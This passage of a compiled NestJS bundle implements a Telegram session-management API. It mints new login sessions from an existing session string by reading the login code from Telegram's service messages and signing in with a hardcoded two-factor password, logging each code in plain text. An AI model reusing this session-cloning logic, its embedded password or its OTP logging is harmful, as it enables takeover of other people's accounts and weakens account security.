    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.SessionController = exports.GetOldestSessionDto = exports.SearchAuditDto = exports.CreateSessionDto = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const session_service_1 = __webpack_require__(/*! ./session.service */ "./src/components/session-manager/session.service.ts");
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
const swagger_2 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
class CreateSessionDto {
}
exports.CreateSessionDto = CreateSessionDto;
__decorate([
    (0, swagger_2.ApiPropertyOptional)({
        description: 'Phone number with country code (optional if session provided)',
        example: '+1234567890'
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], CreateSessionDto.prototype, "mobile", void 0);
__decorate([
    (0, swagger_2.ApiPropertyOptional)({
        description: 'Existing session string to use',
        example: '1BVtsOHIBu2iBJgvn6U6SfJTgN6zPg2CwJjFBw5wHkJfFpBVts...'
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], CreateSessionDto.prototype, "session", void 0);
__decorate([
    (0, swagger_2.ApiPropertyOptional)({
        description: 'Force creation of new session even if active session exists',
        default: false
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Boolean)
], CreateSessionDto.prototype, "forceNew", void 0);
class SearchAuditDto {
}
exports.SearchAuditDto = SearchAuditDto;
__decorate([
    (0, swagger_2.ApiPropertyOptional)({
        description: 'Phone number to search for',
        example: '+1234567890'
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchAuditDto.prototype, "mobile", void 0);
__decorate([
    (0, swagger_2.ApiPropertyOptional)({
        description: 'Session status to filter by',
        enum: ['created', 'active', 'expired', 'revoked', 'failed']
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchAuditDto.prototype, "status", void 0);
__decorate([
    (0, swagger_2.ApiPropertyOptional)({
        description: 'Number of records to return',
        default: 10,
        minimum: 1
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    (0, class_validator_1.Min)(1),
    __metadata("design:type", Number)
], SearchAuditDto.prototype, "limit", void 0);
__decorate([
    (0, swagger_2.ApiPropertyOptional)({
        description: 'Number of records to skip',
        default: 0,
        minimum: 0
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    (0, class_validator_1.Min)(0),
    __metadata("design:type", Number)
], SearchAuditDto.prototype, "offset", void 0);
class GetOldestSessionDto {
}
exports.GetOldestSessionDto = GetOldestSessionDto;
__decorate([
    (0, swagger_2.ApiPropertyOptional)({
        description: 'Phone number to get session for',
        example: '+1234567890'
    }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], GetOldestSessionDto.prototype, "mobile", void 0);
__decorate([
    (0, swagger_2.ApiPropertyOptional)({
        description: 'Force creation of new session if no valid old session exists',
        default: true
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Boolean)
], GetOldestSessionDto.prototype, "allowFallback", void 0);
__decorate([
    (0, swagger_2.ApiPropertyOptional)({
        description: 'Maximum age of session to consider (in days)',
        default: 3000,
        minimum: 1
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    (0, class_validator_1.Min)(0),
    __metadata("design:type", Number)
], GetOldestSessionDto.prototype, "maxAgeDays", void 0);
let SessionController = class SessionController {
    constructor(sessionService) {
        this.sessionService = sessionService;
    }
    async createSession(body) {
        try {
            if (!body.mobile && !body.session) {
                throw new common_1.HttpException({
                    success: false,
                    message: 'Either mobile number or session string is required'
                }, common_1.HttpStatus.BAD_REQUEST);
            }
            if (!body.forceNew && body.mobile) {
                const validSessionResult = await this.sessionService.findRecentValidSession(body.mobile);
                if (validSessionResult.success && validSessionResult.session) {
                    try {
                        await this.sessionService.updateSessionLastUsed(body.mobile, validSessionResult.session.sessionString);
                    }
                    catch (updateError) {
                        console.log('Warning: Failed to update session last used timestamp:', updateError.message);
                    }
                    return {
                        success: true,
                        message: 'Valid session found from this month',
                        session: validSessionResult.session.sessionString,
                        isNew: false
                    };
                }
                else {
                    console.log('No valid session found from this month');
                }
            }
            const options = {
                mobile: body.mobile,
                oldSession: body.session
            };
            const result = await this.sessionService.createSession(options);
            if (result.success) {
                return {
                    success: true,
                    message: 'Session created successfully',
                    session: result.session,
                    isNew: true
                };
            }
            else {
                throw new common_1.HttpException({
                    success: false,
                    message: result.error,
                    retryable: result.retryable
                }, result.retryable ? common_1.HttpStatus.TOO_MANY_REQUESTS : common_1.HttpStatus.BAD_REQUEST);
            }
        }
        catch (error) {
            if (error instanceof common_1.HttpException) {
                throw error;
            }
            throw new common_1.HttpException({
                success: false,
                message: error.message || 'Failed to create/retrieve session'
            }, common_1.HttpStatus.INTERNAL_SERVER_ERROR);
        }
    }
    async searchAudit(mobile, status, limit, offset) {
        try {
            const safeLimit = limit && !isNaN(Number(limit)) && Number(limit) > 0 ? Number(limit) : 10;
            const safeOffset = offset && !isNaN(Number(offset)) && Number(offset) >= 0 ? Number(offset) : 0;
            const options = {
                limit: safeLimit,
                offset: safeOffset
            };
            let result;
            if (mobile) {
                result = await this.sessionService.getSessionAuditHistory(mobile, {
                    ...options,
                    status: status
                });
            }
            else {
                throw new common_1.HttpException({
                    success: false,
                    message: 'Mobile number is required for search'
                }, common_1.HttpStatus.BAD_REQUEST);
            }
            if (result.success) {
                return {
                    success: true,
                    data: result.data || [],
                    total: result.total || 0,
                    message: `Retrieved ${result.data?.length || 0} audit records`
                };
            }
            else {
                throw new common_1.HttpException({
                    success: false,
                    message: result.error || 'Failed to retrieve audit records'
                }, common_1.HttpStatus.BAD_REQUEST);
            }
        }
        catch (error) {
            if (error instanceof common_1.HttpException) {
                throw error;
            }
            throw new common_1.HttpException({
                success: false,
                message: error.message || 'Failed to search audit records'
            }, common_1.HttpStatus.INTERNAL_SERVER_ERROR);
        }
    }
    async getOldestSessionOrCreate(body) {
        try {
            if (!body.mobile || typeof body.mobile !== 'string' || body.mobile.trim().length === 0) {
                throw new common_1.HttpException({
                    success: false,
                    message: 'Mobile number is required and must be a non-empty string',
                    code: 'INVALID_MOBILE'
                }, common_1.HttpStatus.BAD_REQUEST);
            }
            const mobile = body.mobile.trim();
            const allowFallback = body.allowFallback !== false;
            const maxAgeDays = body.maxAgeDays && body.maxAgeDays > 0 ? body.maxAgeDays : 30;
            const result = await this.sessionService.getOldestSessionOrCreate({
                mobile,
                allowFallback,
                maxAgeDays
            });
            if (result.success) {
                return result.data;
            }
            else {
                let httpStatus = common_1.HttpStatus.BAD_REQUEST;
                if (result.code === 'NO_SESSION_FOUND') {
                    httpStatus = common_1.HttpStatus.NOT_FOUND;
                }
                else if (result.code === 'RATE_LIMIT_EXCEEDED') {
                    httpStatus = common_1.HttpStatus.TOO_MANY_REQUESTS;
                }
                else if (result.code === 'FALLBACK_DISABLED') {
                    httpStatus = common_1.HttpStatus.NOT_FOUND;
                }
                throw new common_1.HttpException({
                    success: false,
                    message: result.message,
                    code: result.code,
                    retryable: result.retryable || false
                }, httpStatus);
            }
        }
        catch (error) {
            if (error instanceof common_1.HttpException) {
                throw error;
            }
            console.error('Unexpected error in getOldestSessionOrCreate:', error);
            throw new common_1.HttpException({
                success: false,
                message: 'An unexpected error occurred while processing your request',
                code: 'INTERNAL_ERROR'
            }, common_1.HttpStatus.INTERNAL_SERVER_ERROR);
        }
    }
};
exports.SessionController = SessionController;
__decorate([
    (0, common_1.Post)('create'),
    (0, swagger_1.ApiOperation)({
        summary: 'Master session creation endpoint',
        description: 'Creates or retrieves a session based on provided parameters. If forceNew is true, always creates a new session. If forceNew is false, returns active session if exists and was used this month, otherwise creates new.'
    }),
    (0, swagger_1.ApiBody)({ type: CreateSessionDto }),
    (0, swagger_1.ApiResponse)({
        status: 200,
        description: 'Session created or retrieved successfully',
        schema: {
            type: 'object',
            properties: {
                success: { type: 'boolean', example: true },
                message: { type: 'string', example: 'Session created successfully' },
                session: { type: 'string', example: '1BVtsOHIBu2iBJgvn6U6SfJTgN6z...' },
                isNew: { type: 'boolean', example: true }
            }
        }
    }),
    (0, swagger_1.ApiResponse)({
        status: 400,
        description: 'Bad request - validation failed or session creation failed'
    }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [CreateSessionDto]),
    __metadata("design:returntype", Promise)
], SessionController.prototype, "createSession", null);
__decorate([
    (0, common_1.Get)('audit/search'),
    (0, swagger_1.ApiOperation)({
        summary: 'Search existing audit sessions',
        description: 'Search and retrieve session audit records based on various criteria'
    }),
    (0, swagger_1.ApiQuery)({ name: 'mobile', required: false, type: String, description: 'Phone number to search for' }),
    (0, swagger_1.ApiQuery)({ name: 'status', required: false, enum: ['created', 'active', 'expired', 'revoked', 'failed'], description: 'Filter by session status' }),
    (0, swagger_1.ApiQuery)({ name: 'limit', required: false, type: Number, description: 'Number of records to return (default: 10)' }),
    (0, swagger_1.ApiQuery)({ name: 'offset', required: false, type: Number, description: 'Number of records to skip (default: 0)' }),
    (0, swagger_1.ApiResponse)({
        status: 200,
        description: 'Audit records retrieved successfully',
        schema: {
            type: 'object',
            properties: {
                success: { type: 'boolean', example: true },
                data: {
                    type: 'array',
                    items: {
                        type: 'object',
                        properties: {
                            mobile: { type: 'string', example: '916265240911' },
                            sessionString: { type: 'string', example: '1BQANOTEuM==...' },
                            status: { type: 'string', example: 'active' },
                            creationMethod: { type: 'string', example: 'old_session' },
                            createdAt: { type: 'string', example: '2023-12-01T10:00:00Z' },
                            lastUsedAt: { type: 'string', example: '2023-12-01T15:30:00Z' },
                            usageCount: { type: 'number', example: 5 }
                        }
                    }
                },
                total: { type: 'number', example: 25 },
                message: { type: 'string', example: 'Audit records retrieved successfully' }
            }
        }
    }),
    __param(0, (0, common_1.Query)('mobile')),
    __param(1, (0, common_1.Query)('status')),
    __param(2, (0, common_1.Query)('limit')),
    __param(3, (0, common_1.Query)('offset')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String, Number, Number]),
    __metadata("design:returntype", Promise)
], SessionController.prototype, "searchAudit", null);
__decorate([
    (0, common_1.Post)('oldest'),
    (0, swagger_1.ApiOperation)({
        summary: 'Get oldest valid session or create new session as fallback',
        description: 'Returns the oldest valid session for the mobile number. If no valid session exists and allowFallback is true, creates a new session as fallback. This endpoint is optimized for stability and reliability.'
    }),
    (0, swagger_1.ApiBody)({ type: GetOldestSessionDto }),
    (0, swagger_1.ApiResponse)({
        status: 200,
        description: 'Session retrieved or created successfully',
        schema: {
            type: 'object',
            properties: {
                success: { type: 'boolean', example: true },
                message: { type: 'string', example: 'Oldest session retrieved successfully' },
                data: {
                    type: 'object',
                    properties: {
                        session: { type: 'string', example: '1BVtsOHIBu2iBJgvn6U6SfJTgN6z...' },
                        sessionAge: { type: 'number', example: 5, description: 'Age of session in days' },
                        isNew: { type: 'boolean', example: false, description: 'Whether this is a newly created session' },
                        usageCount: { type: 'number', example: 12, description: 'Number of times this session has been used' },
                        lastUsedAt: { type: 'string', example: '2024-08-05T10:30:00Z', description: 'When the session was last used' },
                        createdAt: { type: 'string', example: '2024-08-01T14:20:00Z', description: 'When the session was created' }
                    }
                }
            }
        }
    }),
    (0, swagger_1.ApiResponse)({
        status: 400,
        description: 'Bad request - validation failed or no session available'
    }),
    (0, swagger_1.ApiResponse)({
        status: 404,
        description: 'No valid session found and fallback disabled'
    }),
    (0, swagger_1.ApiResponse)({
        status: 429,
        description: 'Rate limit exceeded'
    }),
    (0, swagger_1.ApiResponse)({
        status: 500,
        description: 'Internal server error'
    }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [GetOldestSessionDto]),
    __metadata("design:returntype", Promise)
], SessionController.prototype, "getOldestSessionOrCreate", null);
exports.SessionController = SessionController = __decorate([
    (0, swagger_1.ApiTags)('Telegram Session Management'),
    (0, common_1.Controller)('telegram/session'),
    (0, common_1.UsePipes)(new common_1.ValidationPipe({ transform: true, whitelist: true })),
    __metadata("design:paramtypes", [session_service_1.SessionService])
], SessionController);


/***/ }),

/***/ "./src/components/session-manager/session.module.ts":
/*!**********************************************************!*\
  !*** ./src/components/session-manager/session.module.ts ***!
  \**********************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.SessionModule = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const session_controller_1 = __webpack_require__(/*! ./session.controller */ "./src/components/session-manager/session.controller.ts");
const session_service_1 = __webpack_require__(/*! ./session.service */ "./src/components/session-manager/session.service.ts");
const session_audit_service_1 = __webpack_require__(/*! ./session-audit.service */ "./src/components/session-manager/session-audit.service.ts");
const sessions_schema_1 = __webpack_require__(/*! ./schemas/sessions.schema */ "./src/components/session-manager/schemas/sessions.schema.ts");
let SessionModule = class SessionModule {
};
exports.SessionModule = SessionModule;
exports.SessionModule = SessionModule = __decorate([
    (0, common_1.Module)({
        imports: [
            mongoose_1.MongooseModule.forFeature([
                { name: sessions_schema_1.SessionAudit.name, schema: sessions_schema_1.SessionAuditSchema }
            ])
        ],
        controllers: [session_controller_1.SessionController],
        providers: [session_service_1.SessionService, session_audit_service_1.SessionAuditService],
        exports: [session_service_1.SessionService, session_audit_service_1.SessionAuditService]
    })
], SessionModule);


/***/ }),

/***/ "./src/components/session-manager/session.service.ts":
/*!***********************************************************!*\
  !*** ./src/components/session-manager/session.service.ts ***!
  \***********************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.SessionService = exports.SessionManager = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const telegram_1 = __webpack_require__(/*! telegram */ "telegram");
const sessions_1 = __webpack_require__(/*! telegram/sessions */ "telegram/sessions");
const utils_1 = __webpack_require__(/*! ../../utils */ "./src/utils/index.ts");
const telegram_logger_1 = __webpack_require__(/*! ../Telegram/utils/telegram-logger */ "./src/components/Telegram/utils/telegram-logger.ts");
const connection_manager_1 = __webpack_require__(/*! ../Telegram/utils/connection-manager */ "./src/components/Telegram/utils/connection-manager.ts");
const client_registry_1 = __webpack_require__(/*! ./client-registry */ "./src/components/session-manager/client-registry.ts");
const session_audit_service_1 = __webpack_require__(/*! ./session-audit.service */ "./src/components/session-manager/session-audit.service.ts");
const sessions_schema_1 = __webpack_require__(/*! ./schemas/sessions.schema */ "./src/components/session-manager/schemas/sessions.schema.ts");
class SessionManager {
    constructor() {
        this.logger = telegram_logger_1.TelegramLogger.getInstance();
        this.clientRegistry = client_registry_1.ClientRegistry.getInstance();
        this.DEFAULT_PASSWORD = "Ajtdmwajt1@";
        this.DEFAULT_MAX_RETRIES = 3;
        this.DEFAULT_RETRY_DELAY = 5000;
        this.OTP_WAIT_TIME = 120000;
        this.OTP_CHECK_INTERVAL = 3000;
    }
    getApiId() {
        const apiId = parseInt(process.env.API_ID);
        if (isNaN(apiId)) {
            throw new Error('Invalid API_ID: must be a number');
        }
        return apiId;
    }
    getApiHash() {
        const apiHash = process.env.API_HASH;
        if (!apiHash) {
            throw new Error('API_HASH environment variable is required');
        }
        return apiHash;
    }
    static getInstance() {
        if (!SessionManager.instance) {
            SessionManager.instance = new SessionManager();
        }
        return SessionManager.instance;
    }
    async createSession(options) {
        const { mobile, oldSession, password = this.DEFAULT_PASSWORD } = options;
        if (!mobile) {
            return { success: false, error: 'Mobile number is required', retryable: false };
        }
        this.logger.info(mobile, 'Starting session creation process with priority order');
        const existingCheck = this.checkExistingSession(mobile);
        if (!existingCheck.canProceed) {
            return existingCheck.result;
        }
        const strategies = this.getCreationStrategies(options);
        this.logger.info(mobile, `Available strategies: ${strategies.map(s => s.strategyName).join(', ')}`);
        for (const strategy of strategies) {
            try {
                this.logger.info(mobile, `Attempting strategy: ${strategy.strategyName}`);
                const result = await strategy();
                if (result.success) {
                    this.logger.info(mobile, `✓ Session creation successful with ${strategy.strategyName}`);
                    return result;
                }
                this.logger.info(mobile, `✗ Strategy ${strategy.strategyName} failed: ${result.error}`);
            }
            catch (error) {
                this.logger.error(mobile, `✗ Strategy ${strategy.strategyName} threw error`, error);
            }
        }
        return { success: false, error: 'All SessionManager strategies failed', retryable: false };
    }
    checkExistingSession(mobile) {
        if (!mobile || typeof mobile !== 'string') {
            return {
                canProceed: false,
                result: { success: false, error: 'Invalid mobile number provided', retryable: false }
            };
        }
        if (this.clientRegistry.hasClient(mobile)) {
            const clientInfo = this.clientRegistry.getClientInfo(mobile);
            if (clientInfo?.isCreating) {
                return {
                    canProceed: false,
                    result: { success: false, error: 'Session creation already in progress', retryable: true }
                };
            }
            return {
                canProceed: false,
                result: { success: false, error: 'Active session exists. Use cleanup first.', retryable: false }
            };
        }
        return { canProceed: true };
    }
    getCreationStrategies(options) {
        const strategies = [];
        if (options.oldSession) {
            const strategyFunction = () => this.createFromOldSession(options);
            strategyFunction.strategyName = 'oldSession';
            strategies.push(strategyFunction);
        }
        if (options.mobile) {
            const strategyFunction = () => this.createFromExistingManager(options.mobile);
            strategyFunction.strategyName = 'existingManager';
            strategies.push(strategyFunction);
        }
        return strategies;
    }
    async createFromOldSession(options) {
        const { oldSession, mobile, password, maxRetries = this.DEFAULT_MAX_RETRIES, retryDelay = this.DEFAULT_RETRY_DELAY } = options;
        const validation = await this.validateSession(oldSession, mobile);
        if (!validation.isValid) {
            return { success: false, error: `Session validation failed: ${validation.error}`, retryable: false };
        }
        const lockId = await this.clientRegistry.waitForLock(mobile);
        try {
            this.clientRegistry.markClientCreating(mobile, lockId);
            for (let attempt = 1; attempt <= maxRetries; attempt++) {
                try {
                    const newSession = await this.performSessionCreation(oldSession, mobile, password, attempt);
                    return { success: true, session: newSession };
                }
                catch (error) {
                    const errorMessage = error.message || error.toString();
                    const isRetryable = this.isRetryableError(errorMessage);
                    if (!isRetryable || attempt === maxRetries) {
                        return { success: false, error: errorMessage, retryable: isRetryable };
                    }
                    if (attempt < maxRetries) {
                        await (0, utils_1.sleep)(retryDelay);
                    }
                }
            }
            return { success: false, error: 'Max retries exceeded', retryable: false };
        }
        finally {
            if (lockId) {
                await this.clientRegistry.removeClient(mobile, lockId);
                this.clientRegistry.releaseLock(mobile, lockId);
            }
        }
    }
    async createFromExistingManager(mobile) {
        try {
            const client = await connection_manager_1.connectionManager.getClient(mobile);
            const newSession = await client.createNewSession();
            return { success: true, session: newSession };
        }
        catch (error) {
            return {
                success: false,
                error: error.message || 'Existing manager method failed',
                retryable: this.isRetryableError(error.message)
            };
        }
        finally {
            await connection_manager_1.connectionManager.unregisterClient(mobile);
        }
    }
    async validateSession(sessionString, mobile) {
        let tempClient = null;
        try {
            tempClient = new telegram_1.TelegramClient(new sessions_1.StringSession(sessionString), this.getApiId(), this.getApiHash(), { connectionRetries: 1 });
            await tempClient.connect();
            const userInfo = await tempClient.getMe();
            if (!userInfo || userInfo.phone !== mobile) {
                return { isValid: false, error: 'Phone number mismatch or invalid user info' };
            }
            this.logger.info(mobile, 'Session validation successful');
            await this.cleanupClient(tempClient, mobile);
            return { isValid: true, userInfo };
        }
        catch (error) {
            this.logger.error(mobile, 'Session validation failed', error);
            await this.cleanupClient(tempClient, mobile);
            return { isValid: false, error: error.message || error.toString() || error.errorMessage };
        }
        finally {
        }
    }
    async performSessionCreation(oldSessionString, mobile, password, attempt) {
        let oldClient = null;
        let newClient = null;
        try {
            oldClient = new telegram_1.TelegramClient(new sessions_1.StringSession(oldSessionString), this.getApiId(), this.getApiHash(), { connectionRetries: 1 });
            await oldClient.connect();
            await oldClient.getMe();
            newClient = new telegram_1.TelegramClient(new sessions_1.StringSession(''), this.getApiId(), this.getApiHash(), { connectionRetries: 1 });
            await newClient.start({
                phoneNumber: mobile,
                password: async () => password,
                phoneCode: async () => this.waitForOtp(oldClient, mobile, attempt),
                onError: (err) => {
                    throw new Error(`Session start error: ${err.message || err}`);
                }
            });
            return newClient.session.save();
        }
        finally {
            await Promise.all([
                this.cleanupClient(newClient, mobile),
                this.cleanupClient(oldClient, mobile)
            ]);
        }
    }
    async waitForOtp(oldClient, mobile, attempt) {
        const startTime = Date.now();
        this.logger.info(mobile, `Waiting for OTP (attempt ${attempt})`);
        while (Date.now() - startTime < this.OTP_WAIT_TIME) {
            try {
                const messages = await oldClient.getMessages('777000', { limit: 1 });
                const message = messages[0];
                if (message && message.date && (message.date * 1000) > (Date.now() - 120000)) {
                    const messageText = message.text || message.message || '';
                    if (messageText) {
                        const code = this.extractOtpCode(messageText.toLowerCase());
                        if (code) {
                            this.logger.info(mobile, `OTP extracted: ${code}`);
                            return code;
                        }
                    }
                }
                await (0, utils_1.sleep)(this.OTP_CHECK_INTERVAL);
            }
            catch (error) {
                this.logger.error(mobile, 'Error checking OTP messages', error);
                await (0, utils_1.sleep)(this.OTP_CHECK_INTERVAL);
            }
        }
        throw new Error(`OTP timeout after ${this.OTP_WAIT_TIME}ms`);
    }
    extractOtpCode(messageText) {
        const patterns = [
            /code:\*\*(\d{5,6})/,
            /login code:\s*(\d{5,6})/,
            /your code is\s*(\d{5,6})/,
            /verification code:\s*(\d{5,6})/,
            /\b(\d{5,6})\b/
        ];
        for (const pattern of patterns) {
            const match = messageText.match(pattern);
            if (match)
                return match[1];
        }
        return null;
    }
    async cleanupClient(client, mobile) {
        if (!client)
            return;
        try {
            if (client._destroyed) {
                this.logger.info(mobile, 'Client already destroyed, skipping cleanup');
                return;
            }
            await client.destroy();
            if (client._eventBuilders) {
                client._eventBuilders = [];
            }
            connection_manager_1.connectionManager.unregisterClient(mobile);
            await (0, utils_1.sleep)(1000);
        }
        catch (error) {
            this.logger.error(mobile, 'Client cleanup error', error);
        }
        finally {
            if (client) {
                try {
                    client._destroyed = true;
                    if (client._sender && typeof client._sender.disconnect === 'function') {
                        await client._sender.disconnect().catch(() => { });
                    }
                }
                catch (finalCleanupError) {
                    this.logger.error(mobile, 'Final cleanup error', finalCleanupError);
                }
                this.logger.info(mobile, 'Client cleanup completed');
            }
        }
    }
    isRetryableError(errorMessage) {
        const nonRetryableErrors = [
            'user_deactivated_ban', 'auth_key_unregistered', 'session_revoked',
            'phone_number_banned', 'user_deactivated', 'phone_number_invalid',
            'session_password_needed'
        ];
        const retryableErrors = [
            'timeout', 'network_error', 'connection_error', 'flood_wait', 'internal_server_error'
        ];
        const lowerErrorMessage = errorMessage.toLowerCase();
        if (nonRetryableErrors.some(error => lowerErrorMessage.includes(error))) {
            return false;
        }
        if (retryableErrors.some(error => lowerErrorMessage.includes(error))) {
            return true;
        }
        return true;
    }
    getSessionStatus(mobile) {
        const clientInfo = this.clientRegistry.getClientInfo(mobile);
        if (!clientInfo) {
            return { status: 'inactive', activeClients: 0 };
        }
        return {
            status: clientInfo.isCreating ? 'creating' : 'active',
            activeClients: 1,
            lastActivity: clientInfo.lastActivity
        };
    }
    async cleanupSessions(mobile, force = false) {
        try {
            const clientInfo = this.clientRegistry.getClientInfo(mobile);
            if (!clientInfo) {
                return { success: true, cleanedCount: 0 };
            }
            if (clientInfo.isCreating && !force) {
                return {
                    success: false,
                    cleanedCount: 0,
                    error: 'Session creation in progress. Use force=true to cleanup anyway.'
                };
            }
            const cleanedCount = await this.clientRegistry.forceCleanup(mobile);
            return { success: true, cleanedCount };
        }
        catch (error) {
            return {
                success: false,
                cleanedCount: 0,
                error: error.message || 'Cleanup failed'
            };
        }
    }
    getRegistryStats() {
        return this.clientRegistry.getStats();
    }
}
exports.SessionManager = SessionManager;
SessionManager.instance = null;
let SessionService = class SessionService {
    constructor(sessionAuditService) {
        this.logger = telegram_logger_1.TelegramLogger.getInstance();
        this.sessionManager = SessionManager.getInstance();
        this.rateLimitMap = new Map();
        this.MAX_SESSIONS_PER_HOUR = 3;
        this.RATE_LIMIT_WINDOW = 3600000;
        this.sessionAuditService = sessionAuditService;
    }
    getApiId() {
        const apiId = process.env.API_ID;
        if (!apiId) {
            throw new Error('API_ID environment variable is required');
        }
        const parsedApiId = parseInt(apiId);
        if (isNaN(parsedApiId)) {
            throw new Error('Invalid API_ID: must be a number');
        }
        return parsedApiId;
    }
    getApiHash() {
        const apiHash = process.env.API_HASH;
        if (!apiHash) {
            throw new Error('API_HASH environment variable is required');
        }
        return apiHash;
    }
    checkRateLimit(mobile) {
        const now = Date.now();
        const rateLimit = this.rateLimitMap.get(mobile);
        if (!rateLimit || now > rateLimit.resetTime) {
            this.rateLimitMap.set(mobile, { count: 1, resetTime: now + this.RATE_LIMIT_WINDOW });
            return { allowed: true };
        }
        if (rateLimit.count >= this.MAX_SESSIONS_PER_HOUR) {
            return { allowed: false, resetTime: rateLimit.resetTime };
        }
        rateLimit.count++;
        return { allowed: true };
    }
    async extractMobileFromSession(sessionString) {
        let tempClient = null;
        try {
            tempClient = new telegram_1.TelegramClient(new sessions_1.StringSession(sessionString), this.getApiId(), this.getApiHash(), { connectionRetries: 1 });
            await tempClient.connect();
            const userInfo = await tempClient.getMe();
            if (!userInfo || !userInfo.phone) {
                return { error: 'Unable to extract phone number from session' };
            }
            return { mobile: userInfo.phone };
        }
        catch (error) {
            return { error: error.message || error.toString() };
        }
        finally {
            if (tempClient) {
                try {
                    await tempClient.destroy();
                    tempClient._eventBuilders = [];
                    await (0, utils_1.sleep)(1000);
                }
                catch (cleanupError) {
                }
                finally {
                    if (tempClient) {
                        tempClient._destroyed = true;
                        if (tempClient._sender && typeof tempClient._sender.disconnect === 'function') {
                            await tempClient._sender.disconnect().catch(() => { });
                        }
                    }
                }
            }
        }
    }
    async createSession(options) {
        if (!options || typeof options !== 'object') {
            return { success: false, error: 'Invalid options provided', retryable: false };
        }
        let mobile = options.mobile;
        if (!mobile && options.oldSession) {
            try {
                const extractResult = await this.extractMobileFromSession(options.oldSession);
                if (extractResult.error) {
                    return { success: false, error: `Failed to extract mobile from session: ${extractResult.error}`, retryable: false };
                }
                mobile = extractResult.mobile;
                options.mobile = mobile;
            }
            catch (error) {
                return { success: false, error: `Error extracting mobile from session: ${error.message}`, retryable: false };
            }
        }
        this.logger.info(mobile || 'unknown', 'Service: Creating session with priority order: 1.Old Session -> 2.Existing Manager -> 3.Audit Sessions');
        if (!mobile || typeof mobile !== 'string') {
            return { success: false, error: 'Mobile number is required or must be extractable from session', retryable: false };
        }
        const rateLimitCheck = this.checkRateLimit(mobile);
        if (!rateLimitCheck.allowed) {
            const resetTime = new Date(rateLimitCheck.resetTime || 0);
            return {
                success: false,
                error: `Rate limit exceeded. Try again after ${resetTime.toISOString()}`,
                retryable: true
            };
        }
        try {
            if (options.oldSession) {
                this.logger.info(mobile, 'Trying with provided old session (Priority 1)');
                const result = await this.sessionManager.createSession(options);
                if (result.success && result.session) {
                    await this.updateAuditOnSuccess(mobile, result.session, sessions_schema_1.SessionCreationMethod.INPUT_SESSION);
                    return result;
                }
                else {
                    this.logger.info(mobile, `Old session failed: ${result.error}`);
                }
            }
            this.logger.info(mobile, 'Trying with existing manager (Priority 2)');
            const managerResult = await this.sessionManager.createSession({
                ...options,
                oldSession: undefined
            });
            if (managerResult.success && managerResult.session) {
                await this.updateAuditOnSuccess(mobile, managerResult.session, sessions_schema_1.SessionCreationMethod.USER_MOBILE);
                return managerResult;
            }
            else {
                this.logger.info(mobile, `Existing manager failed: ${managerResult.error}`);
            }
            this.logger.info(mobile, 'Trying with audit sessions (Priority 3)');
            const auditResult = await this.tryAuditSessions(mobile, options);
            if (auditResult.success) {
